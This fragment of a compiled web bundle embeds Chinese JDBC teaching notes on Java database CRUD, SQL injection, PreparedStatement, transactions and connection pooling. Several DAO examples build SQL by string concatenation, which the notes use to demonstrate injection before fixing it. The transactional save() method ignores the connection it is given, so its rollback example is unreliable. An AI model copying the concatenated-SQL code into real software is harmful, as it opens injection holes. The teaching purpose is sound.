e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(stat != null) {\r\n            try {\r\n                stat.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n    //将结果返回\r\n    return result;\r\n}\r\n```\r\n\r\n- 业务层\r\n\r\n```java\r\n/*\r\n    删除学生信息\r\n*/\r\n@Override\r\npublic int delete(Integer id) {\r\n    return dao.delete(id);\r\n}\r\n```\r\n\r\n- 控制层\r\n\r\n```java\r\n/*\r\n    删除学生信息\r\n*/\r\n@Test\r\npublic void delete() {\r\n    int result = service.delete(5);\r\n\r\n    if(result != 0) {\r\n        System.out.println("删除成功");\r\n    }else {\r\n        System.out.println("删除失败");\r\n    }\r\n}\r\n```\r\n\r\n### 四、JDBC工具类\r\n\r\n#### 1.工具类的抽取\r\n\r\n- 配置文件(在src下创建config.properties)\r\n\r\n```properties\r\ndriverClass=com.mysql.jdbc.Driver\r\nurl=jdbc:mysql://localhost:3306/db14\r\nusername=root\r\npassword=itheima\r\n```\r\n\r\n- 工具类\r\n\r\n```java\r\n/*\r\n    JDBC工具类\r\n */\r\npublic class JDBCUtils {\r\n    //1.私有构造方法\r\n    private JDBCUtils(){};\r\n\r\n    //2.声明配置信息变量\r\n    private static String driverClass;\r\n    private static String url;\r\n    private static String username;\r\n    private static String password;\r\n    private static Connection con;\r\n\r\n    //3.静态代码块中实现加载配置文件和注册驱动\r\n    static{\r\n        try{\r\n            //通过类加载器返回配置文件的字节流\r\n            InputStream is = JDBCUtils.class.getClassLoader().getResourceAsStream("config.properties");\r\n\r\n            //创建Properties集合，加载流对象的信息\r\n            Properties prop = new Properties();\r\n            prop.load(is);\r\n\r\n            //获取信息为变量赋值\r\n            driverClass = prop.getProperty("driverClass");\r\n            url = prop.getProperty("url");\r\n            username = prop.getProperty("username");\r\n            password = prop.getProperty("password");\r\n\r\n            //注册驱动\r\n            Class.forName(driverClass);\r\n\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    //4.获取数据库连接的方法\r\n    public static Connection getConnection() {\r\n        try {\r\n            con = DriverManager.getConnection(url,username,password);\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        }\r\n\r\n        return con;\r\n    }\r\n\r\n    //5.释放资源的方法\r\n    public static void close(Connection con, Statement stat, ResultSet rs) {\r\n        if(con != null) {\r\n            try {\r\n                con.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(stat != null) {\r\n            try {\r\n                stat.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n\r\n        if(rs != null) {\r\n            try {\r\n                rs.close();\r\n            } catch (SQLException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n\r\n    public static void close(Connection con, Statement stat) {\r\n        close(con,stat,null);\r\n    }\r\n}\r\n```\r\n\r\n#### 2.使用工具类优化student表的CRUD\r\n\r\n- 查询全部\r\n\r\n```java\r\n/*\r\n    查询所有学生信息\r\n*/\r\n@Override\r\npublic ArrayList<Student> findAll() {\r\n    ArrayList<Student> list = new ArrayList<>();\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    ResultSet rs = null;\r\n    try{\r\n\r\n        con = JDBCUtils.getConnection();\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        String sql = "SELECT * FROM student";\r\n        rs = stat.executeQuery(sql);\r\n\r\n        //5.处理结果集\r\n        while(rs.next()) {\r\n            Integer sid = rs.getInt("sid");\r\n            String name = rs.getString("name");\r\n            Integer age = rs.getInt("age");\r\n            Date birthday = rs.getDate("birthday");\r\n\r\n            //封装Student对象\r\n            Student stu = new Student(sid,name,age,birthday);\r\n\r\n            //将student对象保存到集合中\r\n            list.add(stu);\r\n        }\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        JDBCUtils.close(con,stat,rs);\r\n    }\r\n    //将集合对象返回\r\n    return list;\r\n}\r\n```\r\n\r\n- 条件查询\r\n\r\n```java\r\n/*\r\n    条件查询，根据id查询学生信息\r\n*/\r\n@Override\r\npublic Student findById(Integer id) {\r\n    Student stu = new Student();\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    ResultSet rs = null;\r\n    try{\r\n\r\n        con = JDBCUtils.getConnection();\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        String sql = "SELECT * FROM student WHERE sid=\'"+id+"\'";\r\n        rs = stat.executeQuery(sql);\r\n\r\n        //5.处理结果集\r\n        while(rs.next()) {\r\n            Integer sid = rs.getInt("sid");\r\n            String name = rs.getString("name");\r\n            Integer age = rs.getInt("age");\r\n            Date birthday = rs.getDate("birthday");\r\n\r\n            //封装Student对象\r\n            stu.setSid(sid);\r\n            stu.setName(name);\r\n            stu.setAge(age);\r\n            stu.setBirthday(birthday);\r\n        }\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        JDBCUtils.close(con,stat,rs);\r\n    }\r\n    //将对象返回\r\n    return stu;\r\n}\r\n```\r\n\r\n- 新增数据\r\n\r\n```java\r\n/*\r\n     添加学生信息\r\n*/\r\n@Override\r\npublic int insert(Student stu) {\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    int result = 0;\r\n    try{\r\n        con = JDBCUtils.getConnection();\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        Date d = stu.getBirthday();\r\n        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\r\n        String birthday = sdf.format(d);\r\n        String sql = "INSERT INTO student VALUES (\'"+stu.getSid()+"\',\'"+stu.getName()+"\',\'"+stu.getAge()+"\',\'"+birthday+"\')";\r\n        result = stat.executeUpdate(sql);\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        JDBCUtils.close(con,stat);\r\n    }\r\n    //将结果返回\r\n    return result;\r\n}\r\n```\r\n\r\n- 修改数据\r\n\r\n```java\r\n/*\r\n     修改学生信息\r\n*/\r\n@Override\r\npublic int update(Student stu) {\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    int result = 0;\r\n    try{\r\n        con = JDBCUtils.getConnection();\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        Date d = stu.getBirthday();\r\n        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\r\n        String birthday = sdf.format(d);\r\n        String sql = "UPDATE student SET sid=\'"+stu.getSid()+"\',name=\'"+stu.getName()+"\',age=\'"+stu.getAge()+"\',birthday=\'"+birthday+"\' WHERE sid=\'"+stu.getSid()+"\'";\r\n        result = stat.executeUpdate(sql);\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        JDBCUtils.close(con,stat);\r\n    }\r\n    //将结果返回\r\n    return result;\r\n}\r\n```\r\n\r\n- 删除数据\r\n\r\n```java\r\n/*\r\n   删除学生信息\r\n*/\r\n@Override\r\npublic int delete(Integer id) {\r\n    Connection con = null;\r\n    Statement stat = null;\r\n    int result = 0;\r\n    try{\r\n        con = JDBCUtils.getConnection();\r\n\r\n        //3.获取执行者对象\r\n        stat = con.createStatement();\r\n\r\n        //4.执行sql语句，并且接收返回的结果集\r\n        String sql = "DELETE FROM student WHERE sid=\'"+id+"\'";\r\n        result = stat.executeUpdate(sql);\r\n\r\n    } catch(Exception e) {\r\n        e.printStackTrace();\r\n    } finally {\r\n        //6.释放资源\r\n        JDBCUtils.close(con,stat);\r\n    }\r\n    //将结果返回\r\n    return result;\r\n}\r\n```\r\n\r\n#### 3.student表的CRUD整合页面\r\n\r\n- 用户表的数据准备\r\n\r\n```mysql\r\n-- 创建用户表\r\nCREATE TABLE USER(\r\n\tuid VARCHAR(50) PRIMARY KEY,\t-- 用户id\r\n\tucode VARCHAR(50),\t\t\t\t-- 用户标识\r\n\tloginname VARCHAR(100),\t\t\t-- 登录用户名\r\n\tPASSWORD VARCHAR(100),\t\t\t-- 登录密码\r\n\tusername VARCHAR(100),\t\t\t-- 用户名\r\n\tgender VARCHAR(10),\t\t\t\t-- 用户性别\r\n\tbirthday DATE,\t\t\t\t\t-- 出生日期\r\n\tdutydate DATE                   -- 入职日期\r\n);\r\n\r\n-- 添加一条测试数据\r\nINSERT INTO `user` VALUES (\'11111111\', \'zhangsan001\', \'zhangsan\', \'1234\', \'张三\', \'男\', \'2008-10-28\', \'2018-10-28\');\r\n```\r\n\r\n- 将student表的dao层操作复制到项目中的dao层即可\r\n\r\n```java\r\npublic class StudentDaoImpl implements StudentDao {\r\n\r\n    /*\r\n        查询所有学生信息\r\n     */\r\n    @Override\r\n    public ArrayList<Student> findAll() {\r\n        Connection con = null;\r\n        Statement stat = null;\r\n        ResultSet rs = null;\r\n        ArrayList<Student> list = new ArrayList<>();\r\n        try {\r\n            //1.获取连接\r\n            con = JDBCUtils.getConnection();\r\n\r\n            //2.获取执行者对象\r\n            stat = con.createStatement();\r\n\r\n            //3.执行sql语句，并接收结果\r\n            String sql = "SELECT * FROM student";\r\n            rs = stat.executeQuery(sql);\r\n\r\n            //4.处理结果，将每条记录封装成一个Student对象。将多个Student对象保存到集合中\r\n            while(rs.next()) {\r\n                Integer sid = rs.getInt("sid");\r\n                String name = rs.getString("name");\r\n                Integer age = rs.getInt("age");\r\n                Date birthday = rs.getDate("birthday");\r\n\r\n                Student stu = new Student(sid,name,age,birthday);\r\n\r\n                list.add(stu);\r\n            }\r\n\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        } finally {\r\n            //5.释放资源\r\n            JDBCUtils.close(con,stat,rs);\r\n        }\r\n\r\n        return list;\r\n    }\r\n\r\n    /*\r\n        条件查询，根据id查询学生信息\r\n     */\r\n    @Override\r\n    public Student findById(Integer id) {\r\n        Connection con = null;\r\n        Statement stat = null;\r\n        ResultSet rs = null;\r\n        Student stu = new Student();\r\n        try {\r\n            //1.获取连接\r\n            con = JDBCUtils.getConnection();\r\n\r\n            //2.获取执行者对象\r\n            stat = con.createStatement();\r\n\r\n            //3.执行sql语句，并接收结果\r\n            String sql = "SELECT * FROM student WHERE sid=\'"+id+"\'";\r\n            rs = stat.executeQuery(sql);\r\n\r\n            //4.处理结果，将记录封装成一个Student对象。\r\n            if(rs.next()) {\r\n                Integer sid = rs.getInt("sid");\r\n                String name = rs.getString("name");\r\n                Integer age = rs.getInt("age");\r\n                Date birthday = rs.getDate("birthday");\r\n\r\n                stu.setSid(sid);\r\n                stu.setName(name);\r\n                stu.setAge(age);\r\n                stu.setBirthday(birthday);\r\n            }\r\n\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        } finally {\r\n            //5.释放资源\r\n            JDBCUtils.close(con,stat,rs);\r\n        }\r\n\r\n        return stu;\r\n    }\r\n\r\n    /*\r\n        新增学生信息\r\n     */\r\n    @Override\r\n    public int insert(Student stu) {\r\n        Connection con = null;\r\n        Statement stat = null;\r\n        int result = 0;\r\n        try{\r\n            //1.获取连接\r\n            con = JDBCUtils.getConnection();\r\n\r\n            //2.获取执行者对象\r\n            stat = con.createStatement();\r\n\r\n            //3.执行sql语句，并接收结果\r\n            Date date = stu.getBirthday();\r\n            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\r\n            String birthday = sdf.format(date);\r\n            String sql = "INSERT INTO student VALUES (null,\'"+stu.getName()+"\',\'"+stu.getAge()+"\',\'"+birthday+"\')";\r\n            result = stat.executeUpdate(sql);\r\n\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        } finally {\r\n            //4.释放资源\r\n            JDBCUtils.close(con,stat);\r\n        }\r\n\r\n        return result;\r\n    }\r\n\r\n    /*\r\n        修改学生信息\r\n     */\r\n    @Override\r\n    public int update(Student stu) {\r\n        Connection con = null;\r\n        Statement stat = null;\r\n        int result = 0;\r\n        try{\r\n            //1.获取连接\r\n            con = JDBCUtils.getConnection();\r\n\r\n            //2.获取执行者对象\r\n            stat = con.createStatement();\r\n\r\n            //3.执行sql语句，并接收结果\r\n            Date date = stu.getBirthday();\r\n            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");\r\n            String birthday = sdf.format(date);\r\n            String sql = "UPDATE student SET sid=\'"+stu.getSid()+"\',name=\'"+stu.getName()+"\',age=\'"+stu.getAge()+"\',birthday=\'"+birthday+"\' WHERE sid=\'"+stu.getSid()+"\'";\r\n            result = stat.executeUpdate(sql);\r\n\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        } finally {\r\n            //4.释放资源\r\n            JDBCUtils.close(con,stat);\r\n        }\r\n\r\n        return result;\r\n    }\r\n\r\n    /*\r\n        删除学生信息\r\n     */\r\n    @Override\r\n    public int delete(Integer id) {\r\n        Connection con = null;\r\n        Statement stat = null;\r\n        int result = 0;\r\n        try{\r\n            //1.获取连接\r\n            con = JDBCUtils.getConnection();\r\n\r\n            //2.获取执行者对象\r\n            stat = con.createStatement();\r\n\r\n            //3.执行sql语句，并接收结果\r\n            String sql = "DELETE FROM student WHERE sid=\'"+id+"\'";\r\n            result = stat.executeUpdate(sql);\r\n\r\n        } catch (SQLException e) {\r\n            e.printStackTrace();\r\n        }  finally {\r\n            //4.释放资源\r\n            JDBCUtils.close(con,stat);\r\n        }\r\n\r\n        return result;\r\n    }\r\n}\r\n```\r\n\r\n### 五、SQL注入攻击\r\n\r\n#### 1.sql注入攻击的演示\r\n\r\n- 在登录界面，输入一个错误的用户名或密码，也可以登录成功\r\n\r\n![06](./img/java/jdbc/JDBC-01-授课笔记.assets/06.png)\r\n\r\n#### 2.sql注入攻击的原理\r\n\r\n- 按照正常道理来说，我们在密码处输入的所有内容，都应该认为是密码的组成\r\n- 但是现在Statement对象在执行sql语句时，将一部分内容当做查询条件来执行了\r\n\r\n#### 3.PreparedStatement的介绍\r\n\r\n- 预编译sql语句的执行者对象。在执行sql语句之前，将sql语句进行提前编译。明确sql语句的格式后，就不会改变了。剩余的内容都会认为是参数！参数使用?作为占位符\r\n- 为参数赋值的方法：setXxx(参数1,参数2);\r\n  - 参数1：?的位置编号(编号从1开始)\r\n  - 参数2：?的实际参数\r\n- 执行sql语句的方法\r\n  - 执行insert、update、delete语句：int executeUpdate();\r\n  - 执行select语句：ResultSet executeQuery();\r\n\r\n#### 4.PreparedStatement的使用\r\n\r\n```java\r\n/*\r\n\t 使用PreparedStatement的登录方法，解决注入攻击\r\n*/\r\n@Override\r\npublic User findByLoginNameAndPassword(String loginName, String password) {\r\n    //定义必要信息\r\n    Connection conn = null;\r\n    PreparedStatement pstm = null;\r\n    ResultSet rs = null;\r\n    User user = null;\r\n    try {\r\n        //1.获取连接\r\n        conn = JDBCUtils.getConnection();\r\n        //2.创建操作SQL对象\r\n        String sql = "SELECT * FROM user WHERE loginname=? AND password=?";\r\n        pstm = conn.prepareStatement(sql);\r\n        //3.设置参数\r\n        pstm.setString(1,loginName);\r\n        pstm.setString(2,password);\r\n        System.out.println(sql);\r\n        //4.执行sql语句，获取结果集\r\n        rs = pstm.executeQuery();\r\n        //5.获取结果集\r\n        if (rs.next()) {\r\n            //6.封装\r\n            user = new User();\r\n            user.setUid(rs.getString("uid"));\r\n            user.setUcode(rs.getString("ucode"));\r\n            user.setUsername(rs.getString("username"));\r\n            user.setPassword(rs.getString("password"));\r\n            user.setGender(rs.getString("gender"));\r\n            user.setDutydate(rs.getDate("dutydate"));\r\n            user.setBirthday(rs.getDate("birthday"));\r\n            user.setLoginname(rs.getString("loginname"));\r\n        }\r\n        //7.返回\r\n        return user;\r\n    }catch (Exception e){\r\n        throw new RuntimeException(e);\r\n    }finally {\r\n        JDBCUtils.close(conn,pstm,rs);\r\n    }\r\n}\r\n```\r\n\r\n#### 5.使用PreparedStatement优化student表的CRUD（作业）\r\n\r\n```java\r\npublic class StudentDaoImpl implements StudentDao {\r\n\r\n    @Override\r\n    public ArrayList<Student> findAll() {\r\n        //定义必要信息\r\n        Connection conn = null;\r\n        PreparedStatement pstm = null;\r\n        ResultSet rs = null;\r\n        ArrayList<Student> students = null;\r\n        try {\r\n            //1.获取连接\r\n            conn = JDBCUtils.getConnection();\r\n            //2.获取操作对象\r\n            pstm = conn.prepareStatement("select * from student");\r\n            //3.执行sql语句，获取结果集\r\n            rs = pstm.executeQuery();\r\n            //4.遍历结果集\r\n            students = new ArrayList<Student>();\r\n            while (rs.next()) {\r\n                //5.封装\r\n                Student student = new Student();\r\n                student.setSid(rs.getInt("sid"));\r\n                student.setName(rs.getString("name"));\r\n                student.setAge(rs.getInt("age"));\r\n                student.setBirthday(rs.getDate("birthday"));\r\n                //加入到集合中\r\n                students.add(student);\r\n            }\r\n            //6.返回\r\n            return students;\r\n        }catch (Exception e){\r\n            throw new RuntimeException(e);\r\n        }finally {\r\n            JDBCUtils.close(conn,pstm,rs);\r\n        }\r\n    }\r\n\r\n    @Override\r\n    public Student findById(Integer sid) {\r\n        //定义必要信息\r\n        Connection conn = null;\r\n        PreparedStatement pstm = null;\r\n        ResultSet rs = null;\r\n        Student student = null;\r\n        try {\r\n            //1.获取连接\r\n            conn = JDBCUtils.getConnection();\r\n            //2.获取操作对象\r\n            pstm = conn.prepareStatement("select * from student where sid = ? ");\r\n            pstm.setInt(1,sid);\r\n            //3.执行sql语句，获取结果集\r\n            rs = pstm.executeQuery();\r\n            //4.遍历结果集\r\n            if (rs.next()) {\r\n                //5.封装\r\n                student = new Student();\r\n                student.setSid(rs.getInt("sid"));\r\n                student.setName(rs.getString("name"));\r\n                student.setAge(rs.getInt("age"));\r\n                student.setBirthday(rs.getDate("birthday"));\r\n            }\r\n            //6.返回\r\n            return student;\r\n        }catch (Exception e){\r\n            throw new RuntimeException(e);\r\n        }finally {\r\n            JDBCUtils.close(conn,pstm,rs);\r\n        }\r\n    }\r\n\r\n    @Override\r\n    public int insert(Student student) {\r\n        //定义必要信息\r\n        Connection conn = null;\r\n        PreparedStatement pstm = null;\r\n        int result = 0;\r\n        try {\r\n            //1.获取连接\r\n            conn = JDBCUtils.getConnection();\r\n            //2.获取操作对象\r\n            pstm = conn.prepareStatement("insert into student(sid,name,age,birthday)values(null,?,?,?)");\r\n            //3.设置参数\r\n            //pstm.setInt(1,null);\r\n            pstm.setString(1,student.getName());\r\n            pstm.setInt(2,student.getAge());\r\n            pstm.setDate(3,new Date(student.getBirthday().getTime()));\r\n            //4.执行sql语句\r\n            result = pstm.executeUpdate();\r\n        }catch (Exception e){\r\n            throw new RuntimeException(e);\r\n        }finally {\r\n            JDBCUtils.close(conn,pstm);\r\n        }\r\n        return result;\r\n    }\r\n\r\n    @Override\r\n    public int update(Student student) {\r\n        //定义必要信息\r\n        Connection conn = null;\r\n        PreparedStatement pstm = null;\r\n        int result = 0;\r\n        try {\r\n            //1.获取连接\r\n            conn = JDBCUtils.getConnection();\r\n            //2.获取操作对象\r\n            pstm = conn.prepareStatement("update student set name=?,age=?,birthday=? where sid=? ");\r\n            //3.设置参数\r\n            pstm.setString(1,student.getName());\r\n            pstm.setInt(2,student.getAge());\r\n            pstm.setDate(3,new Date(student.getBirthday().getTime()));\r\n            pstm.setInt(4,student.getSid());\r\n            //4.执行sql语句\r\n            result = pstm.executeUpdate();\r\n        }catch (Exception e){\r\n            throw new RuntimeException(e);\r\n        }finally {\r\n            JDBCUtils.close(conn,pstm);\r\n        }\r\n        return result;\r\n    }\r\n\r\n    @Override\r\n    public int delete(Integer sid) {\r\n        //定义必要信息\r\n        Connection conn = null;\r\n        PreparedStatement pstm = null;\r\n        int result = 0;\r\n        try {\r\n            //1.获取连接\r\n            conn = JDBCUtils.getConnection();\r\n            //2.获取操作对象\r\n            pstm = conn.prepareStatement("delete from student where sid=? ");\r\n            //3.设置参数\r\n            pstm.setInt(1,sid);\r\n            //4.执行sql语句\r\n            result = pstm.executeUpdate();\r\n        }catch (Exception e){\r\n            throw new RuntimeException(e);\r\n        }finally {\r\n            JDBCUtils.close(conn,pstm);\r\n        }\r\n        return result;\r\n    }\r\n}\r\n```\r\n\r\n### 六、综合案例-课程表批量新增加事务管理\r\n\r\n#### 1.service层\r\n\r\n- 接口\r\n\r\n```java\r\n/*\r\n\t 批量添加\r\n*/\r\nvoid batchAdd(List<User> users);\r\n```\r\n\r\n- 实现类\r\n\r\n```java\r\n/*\r\n      事务要控制在此处\r\n*/\r\n@Override\r\npublic void batchAdd(List<User> users) {\r\n    //获取数据库连接\r\n    Connection connection = JDBCUtils.getConnection();\r\n    try {\r\n        //开启事务\r\n        connection.setAutoCommit(false);\r\n        for (User user : users) {\r\n            //1.创建ID,并把UUID中的-替换\r\n            String uid = UUID.randomUUID().toString().replace("-", "").toUpperCase();\r\n            //2.给user的uid赋值\r\n            user.setUid(uid);\r\n            //3.生成员工编号\r\n            user.setUcode(uid);\r\n\r\n            //模拟异常\r\n            //int n = 1 / 0;\r\n\r\n            //4.保存\r\n            userDao.save(connection,user);\r\n        }\r\n        //提交事务\r\n        connection.commit();\r\n    }catch (Exception e){\r\n        try {\r\n            //回滚事务\r\n            connection.rollback();\r\n        }catch (Exception ex){\r\n            ex.printStackTrace();\r\n        }\r\n        e.printStackTrace();\r\n    }finally {\r\n        JDBCUtils.close(connection,null,null);\r\n    }\r\n}\r\n```\r\n\r\n#### 2.dao层\r\n\r\n- 接口\r\n\r\n```java\r\n/**\r\n\t支持事务的添加\r\n*/\r\nvoid save(Connection connection,User user);\r\n```\r\n\r\n- 实现类\r\n\r\n```java\r\n/*\r\n       支持事务的添加\r\n*/\r\n@Override\r\npublic void save(Connection connection, User user) {\r\n    //定义必要信息\r\n    PreparedStatement pstm = null;\r\n    try {\r\n        //1.获取连接\r\n        connection = JDBCUtils.getConnection();\r\n        //2.获取操作对象\r\n        pstm = connection.prepareStatement("insert into user(uid,ucode,loginname,password,username,gender,birthday,dutydate)values(?,?,?,?,?,?,?,?)");\r\n        //3.设置参数\r\n        pstm.setString(1,user.getUid());\r\n        pstm.setString(2,user.getUcode());\r\n        pstm.setString(3,user.getLoginname());\r\n        pstm.setString(4,user.getPassword());\r\n        pstm.setString(5,user.getUsername());\r\n        pstm.setString(6,user.getGender());\r\n        pstm.setDate(7,new Date(user.getBirthday().getTime()));\r\n        pstm.setDate(8,new Date(user.getDutydate().getTime()));\r\n        //4.执行sql语句，获取结果集\r\n        pstm.executeUpdate();\r\n    }catch (Exception e){\r\n        throw new RuntimeException(e);\r\n    }finally {\r\n        JDBCUtils.close(null,pstm,null);\r\n    }\r\n}\r\n```\r\n\r\n',vr={data:function(){return{MainComponent:br}}},hr=vr,Sr=Object(u["a"])(hr,dr,gr,!1,null,"3c00a60c",null),yr=Sr.exports,fr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},_r=[],xr='\x3c!--\r\n * @Date           : 2021-04-12 16:03:42\r\n * @FilePath       : /jinnian-space/src/pages/java/module/jdbc/md/JDBC-02-授课笔记.md\r\n * @Description    : \r\n--\x3e\r\n# JDBC-02-授课笔记\r\n\r\n### 一、数据库连接池\r\n\r\n#### 1.数据库连接池的概念\r\n\r\n- 数据库连接背景\r\n  - 数据库连接是一种关键的、有限的、昂贵的资源，这一点在多用户的网页应用程序中体现得尤为突出。对数据库连接的管理能显著影响到整个应用程序的伸缩性和健壮性，影响到程序的性能指标。数据库连接池正是针对这个问题提出来的。\r\n- 数据库连接池\r\n  - 数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个。这项技术能明显提高对数据库操作的性能。\r\n- 数据库连接池原理\r\n\r\n![01](./img/java/jdbc/JDBC-02-授课笔记.assets/01.png)\r\n\r\n#### 2.自定义连接池\r\n\r\n- java.sql.DataSource接口：数据源(数据库连接池)。java官方提供的数据库连接池规范(接口)\r\n  - 获取数据库连接对象：Connection getConnection();\r\n- 自定义连接池\r\n\r\n```java\r\n/*\r\n\t自定义连接池类\r\n*/\r\npublic class MyDataSource implements DataSource{\r\n    //定义集合容器，用于保存多个数据库连接对象\r\n    private static List<Connection> pool = Collections.synchronizedList(new ArrayList<Connection>());\r\n\r\n    //静态代码块，生成10个数据库连接保存到集合中\r\n    static {\r\n        for (int i = 0; i < 10; i++) {\r\n            Connection con = JDBCUtils.getConnection();\r\n            pool.add(con);\r\n        }\r\n    }\r\n\r\n    //返回连接池的大小\r\n    public int getSize() {\r\n        return pool.size();\r\n    }\r\n\r\n    //从池中返回一个数据库连接\r\n    @Override\r\n    public Connection getConnection() {\r\n        if(pool.size() > 0) {\r\n            //从池中获取数据库连接\r\n            return pool.remove(0);\r\n        }else {\r\n            throw new RuntimeException("连接数量已用尽");\r\n        }\r\n    }\r\n\r\n    @Override\r\n    public Connection getConnection(String username, String password) throws SQLException {\r\n        return null;\r\n    }\r\n\r\n    @Override\r\n    public <T> T unwrap(Class<T> iface) throws SQLException {\r\n        return null;\r\n    }\r\n\r\n    @Override\r\n    public boolean isWrapperFor(Class<?> iface) throws SQLException {\r\n        return false;\r\n    }\r\n\r\n    @Override\r\n    public PrintWriter getLogWriter() throws SQLException {\r\n        return null;\r\n    }\r\n\r\n    @Override\r\n    public void setLogWriter(PrintWriter out) throws SQLException {\r\n\r\n    }\r\n\r\n    @Override\r\n    public void setLoginTimeout(int seconds) throws SQLException {\r\n\r\n    }\r\n\r\n    @Override\r\n    public int getLoginTimeout() throws SQLException {\r\n        return 0;\r\n    }\r\n\r\n    @Override\r\n    public Logger getParentLogger() throws SQLFeatureNotSupportedException {\r\n        return null;\r\n    }\r\n}\r\n```\r\n\r\n#### 3.自定义连接池测试\r\n\r\n```java\r\npublic class MyDataSourceTest {\r\n    public static void main(String[] args) throws Exception{\r\n        //创建数据库连接池对象\r\n        MyDataSource dataSource = new MyDataSource();\r\n\r\n        System.out.println("使用之前连接池数量：" + dataSource.getSize());\r\n        \r\n        //获取数据库连接对象\r\n        Connection con = dataSource.getConnection();\r\n        System.out.println(con.getClass());// JDBC4Connection\r\n\r\n        //查询学生表全部信息\r\n        String sql = "SELECT * FROM student";\r\n        PreparedStatement pst = con.prepareStatement(sql);\r\n        ResultSet rs = pst.executeQuery();\r\n\r\n        while(rs.next()) {\r\n            System.out.println(rs.getInt("sid") + "\\t" + rs.getString("name") + "\\t" + rs.getInt("age") + "\\t" + rs.getDate("birthday"));\r\n        }\r\n        \r\n        //释放资源\r\n        rs.close();\r\n        pst.close();\r\n\t\t//目前的连接对象close方法，是直接关闭连接，而不是将连接归还池中\r\n        con.close();\r\n\r\n        System.out.println("使用之后连接池数量：" + dataSource.getSize());\r\n    }\r\n}\r\n```\r\n\r\n#### 4.归还连接\r\n\r\n- 继承(无法解决)\r\n\r\n  - 通过打印连接对象，发现DriverManager获取的连接实现类是JDBC4Connection。\r\n  - 自定义一个类，继承JDBC4Connection这个类，重写close()方法。\r\n\r\n  ```java\r\n  /*\r\n      自定义Connection类\r\n   */\r\n  public class MyConnection1 extends JDBC4Connection {\r\n      //声明连接对象和连接池集合对象\r\n      private Connection con;\r\n      private List<Connection> pool;\r\n  \r\n      //通过构造方法给成员变量赋值\r\n      public MyConnection1(String hostToConnectTo, int portToConnectTo, Properties info, String databaseToConnectTo, String url,Connection con,List<Connection> pool) throws SQLException {\r\n          super(hostToConnectTo, portToConnectTo, info, databaseToConnectTo, url);\r\n          this.con = con;\r\n          this.pool = pool;\r\n      }\r\n  \r\n      //重写close()方法，将连接归还给池中\r\n      @Override\r\n      public void close() throws SQLException {\r\n          pool.add(con);\r\n      }\r\n  }\r\n  ```\r\n\r\n  - 但是这种方式行不通，通过查看JDBC工具类获取连接的方法我们发现：我们虽然自定义了一个子类，完成了归还连接的操作。但是DriverManager获取的还是JDBC4Connection这个对象，并不是我们的子类对象。而我们又不能整体去修改驱动包中类的功能！\r\n\r\n  ```java\r\n  //将之前的连接对象换成自定义的子类对象\r\n  private static MyConnection1 con;\r\n  \r\n  //4.获取数据库连接的方法\r\n  public static Connection getConnection() {\r\n      try {\r\n          //等效于：MyConnection1 con = new JDBC4Connection();  语法错误！\r\n          con = DriverManager.getConnection(url,username,password);\r\n      } catch (SQLException e) {\r\n          e.printStackTrace();\r\n      }\r\n  \r\n      return con;\r\n  }\r\n  ```\r\n\r\n- 装饰设计模式\r\n\r\n  - 自定义连接类\r\n\r\n  ```java\r\n  /*\r\n      自定义Connection类。通过装饰设计模式，实现和mysql驱动包中的Connection实现类相同的功能！\r\n      实现步骤：\r\n          1.定义一个类，实现Connection接口\r\n          2.定义Connection连接对象和连接池容器对象的变量\r\n          3.提供有参构造方法，接收连接对象和连接池对象，对变量赋值\r\n          4.在close()方法中，完成连接的归还\r\n          5.剩余方法，只需要调用mysql驱动包的连接对象完成即可\r\n   */\r\n  public class MyConnection2 implements Connection {\r\n  \r\n      //2.定义Connection连接对象和连接池容器对象的变量\r\n      private Connection con;\r\n      private List<Connection> pool;\r\n  \r\n      //3.提供有参构造方法，接收连接对象和连接池对象，对变量赋值\r\n      public MyConnection2(Connection con,List<Connection> pool) {\r\n          this.con = con;\r\n          this.pool = pool;\r\n      }\r\n  \r\n      //4.在close()方法中，完成连接的归还\r\n      @Override\r\n      public void close() throws SQLException {\r\n          pool.add(con);\r\n      }\r\n  \r\n  \r\n      @Override\r\n      public Statement createStatement() throws SQLException {\r\n          return con.createStatement();\r\n      }\r\n  \r\n      @Override\r\n     